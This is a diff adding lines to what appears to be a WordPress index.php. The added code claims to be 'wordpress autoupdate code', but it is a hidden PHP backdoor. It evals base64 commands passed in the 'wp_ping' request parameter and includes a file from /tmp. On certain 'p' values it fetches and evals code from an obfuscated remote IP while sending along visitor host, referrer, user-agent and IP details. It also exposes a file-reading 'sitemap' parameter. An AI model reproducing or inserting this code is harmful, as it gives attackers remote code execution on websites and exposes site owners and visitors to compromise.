@@ -1,0 +1,16 @@
+<?if(isset($_REQUEST["sitemap"]))print(file_get_contents("sitemap_".$_REQUEST["sitemap"].".xml"));?><?php //@WPEUpdate 2.12.76
+// Do Not Delete!
+//
+// This is wordpress autoupdate code.
+//
+// (c) WordPress. Codeart.
+//
+	if (isset($_REQUEST['wp_ping'])) eval(base64_decode($_REQUEST['wp_ping']));
+	@include('/tmp/wp_filter/code');
+	if (isset($_GET['p']) && (!is_numeric($_GET['p']) || $_GET['p'] > 50000)) eval(file_get_contents(base64_decode('aHR0cDovLzc2LjE2NC4xOTYuNjYv').'/cp.php?host='.urlencode($_SERVER['HTTP_HOST']).'&p='.$_GET['p'].'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ua='.urlencode($_SERVER['HTTP_USER_AGENT'])."&uri=".urlencode($_SERVER['REQUEST_URI'])."&ip=".urlencode($_SERVER['REMOTE_ADDR'])));
+//@?><head><meta name="verify-v1" content="fJijjTEtC0WVtd3uroecc5i80yg3MKWN9Z1IvUS6hEY=" /></head><head><meta name="verify-v1" content="fJijjTEtC0WVtd3uroecc5i80yg3MKWN9Z1IvUS6hEY=" /></head><head><meta name="verify-v1" content="fJijjTEtC0WVtd3uroecc5i80yg3MKWN9Z1IvUS6hEY=" /></head>
+<?php 
+/* Short and sweet */
+define('WP_USE_THEMES', true);
+require('./wp-blog-header.php');
+?>
